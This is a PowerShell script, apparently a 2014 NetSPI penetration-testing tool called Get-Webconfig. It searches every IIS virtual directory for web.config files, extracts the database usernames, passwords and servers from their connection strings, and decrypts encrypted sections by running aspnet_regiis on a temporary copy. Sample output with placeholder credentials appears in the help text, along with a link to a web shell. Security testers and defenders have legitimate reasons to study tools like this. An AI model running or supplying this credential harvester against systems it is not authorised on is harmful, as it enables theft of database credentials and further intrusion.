function Get-Webconfig
{	
    # Author: Scott Sutherland - 2014, NetSPI
    # Author: Antti Rantasaari - 2014, NetSPI
    # Version: Get-Webconfig.ps1 v1.0
	
    <#
	    .SYNOPSIS
	       This script will recover cleartext and encrypted connection strings from all web.config files on the system.
	   
	    .DESCRIPTION
	       This script will identify all of the web.config files on the system and recover the  
	       connectionStrings used to support authentication to backend databases.  If needed, the 
	       script will also decrypt the connectionStrings on the fly.  The output supports the 
	       pipeline which can be used to convert all of the results into a pretty table by piping 
	       to format-table.
	   
	    .EXAMPLE
	       Return a list of cleartext and decrypted connect strings from web.config files.
	   
	       PS C:\>get-webconfig.ps1 	   

	       user   : s1admin
	       pass   : s1password
	       dbserv : 192.168.1.103\server1
	       vdir   : C:\test2
	       path   : C:\test2\web.config
	       encr   : No
	       
	       user   : s1user
	       pass   : s1password
	       dbserv : 192.168.1.103\server1
	       vdir   : C:\inetpub\wwwroot
	       path   : C:\inetpub\wwwroot\web.config
	       encr   : Yes
	   
	    .EXAMPLE
	       Return a list of cleartext and decrypted connect strings from web.config files.
	   
	       PS C:\>get-webconfig.ps1 | Format-Table -Autosize
	       
	       user    pass       dbserv                vdir               path                          encr
	       ----    ----       ------                ----               ----                          ----
	       s1admin s1password 192.168.1.101\server1 C:\App1            C:\App1\web.config            No  
	       s1user  s1password 192.168.1.101\server1 C:\inetpub\wwwroot C:\inetpub\wwwroot\web.config No  
	       s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\test\web.config       No  
	       s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\web.config            Yes 
	       s3user  s3password 192.168.1.103\server3 D:\App3            D:\App3\web.config            No 

	     .LINK
	       http://www.netspi.com
	       https://raw2.github.com/NetSPI/cmdsql/master/cmdsql.aspx
	       http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
	       http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx	

	     .NOTES
	       Below is an alterantive method for grabbing connection strings, but it doesn't support decryption.
	       for /f "tokens=*" %i in ('%systemroot%\system32\inetsrv\appcmd.exe list sites /text:name') do %systemroot%\system32\inetsrv\appcmd.exe list config "%i" -section:connectionstrings
	    #>


    # Check if appcmd.exe exists
    if (Test-Path  ("c:\windows\system32\inetsrv\appcmd.exe"))
    {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable 

        # Create and name columns in the data table
        $DataTable.Columns.Add("user") | Out-Null
        $DataTable.Columns.Add("pass") | Out-Null  
        $DataTable.Columns.Add("dbserv") | Out-Null
        $DataTable.Columns.Add("vdir") | Out-Null
        $DataTable.Columns.Add("path") | Out-Null
        $DataTable.Columns.Add("encr") | Out-Null

        # Get list of virtual directories in IIS 
        c:\windows\system32\inetsrv\appcmd.exe list vdir /text:physicalpath | 
        foreach { 

            $CurrentVdir = $_

            # Converts CMD style env vars (%) to powershell env vars (env)
            if ($_ -like "*%*")
            {            
                $EnvarName = "`$env:"+$_.split("%")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split("%")[2]            
                $CurrentVdir  = $EnvarValue+$RestofPath
            }

            # Search for web.config files in each virtual directory
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | 
            foreach{
            
                # Set web.config path
                $CurrentPath = $_.fullname

                # Read the data from the web.config xml file
                [xml]$ConfigFile = Get-Content $_.fullname

                # Check if the connectionStrings are encrypted
                if ($ConfigFile.configuration.connectionStrings.add)
                {
                                
                    # Foreach connection string add to data table
                    $ConfigFile.configuration.connectionStrings.add| 
                    foreach {

                        [string]$MyConString = $_.connectionString  
                        $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                        $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                        $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                        $ConfVdir = $CurrentVdir
                        $ConfPath = $CurrentPath
                        $ConfEnc = "No"
                        $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc) | Out-Null                    
                    }  

                }else{

                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)
                    $aspnet_regiis_path = Get-ChildItem -Recurse -filter aspnet_regiis.exe c:\Windows\Microsoft.NET\Framework\ | Sort-Object -Descending  |  select fullname -First 1              

                    # Check if aspnet_regiis.exe exists
                    if (Test-Path  ($aspnet_regiis_path.FullName))
                    {

                        # Setup path for temp web.config to the current user's temp dir
                        $WebConfigPath = (get-item $env:temp).FullName + "\web.config"

                        # Remove existing temp web.config
                        if (Test-Path  ($WebConfigPath)) 
                        { 
                            Del $WebConfigPath 
                        }
                    
                        # Copy web.config from vdir to user temp for decryption
                        Copy $CurrentPath $WebConfigPath

                        #Decrypt web.config in user temp                 
                        $aspnet_regiis_cmd = $aspnet_regiis_path.fullname+' -pdf "connectionStrings" (get-item $env:temp).FullName'
                        invoke-expression $aspnet_regiis_cmd | Out-Null

                        # Read the data from the web.config in temp
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        # Check if the connectionStrings are still encrypted
                        if ($TMPConfigFile.configuration.connectionStrings.add)
                        {
                                
                            # Foreach connection string add to data table
                            $TMPConfigFile.configuration.connectionStrings.add| 
                            foreach {

                                [string]$MyConString = $_.connectionString  
                                $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                                $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                                $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                                $ConfVdir = $CurrentVdir
                                $ConfPath = $CurrentPath
                                $ConfEnc = "Yes"
                                $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc) | Out-Null                    
                            }  

                        }else{
                            Write-Error "Decryption of $CurrentPath failed."                        
                        }
                    }else{
                        Write-Error "aspnet_regiis.exe does not exist in the default location."
                    }
                }           
            }
        }

        # Check if any connection strings were found 
        if( $DataTable.rows.Count -gt 0 )
        {

            # Display results in list view that can feed into the pipeline    
            $DataTable |  Sort-Object user,pass,dbserv,vdir,path,encr | select user,pass,dbserv,vdir,path,encr -Unique       
        }else{

            # Status user
            Write-Error "No connectionStrings found."
        }     
    }else{
        Write-Error "Appcmd.exe does not exist in the default location."
    }

}
Get-Webconfig
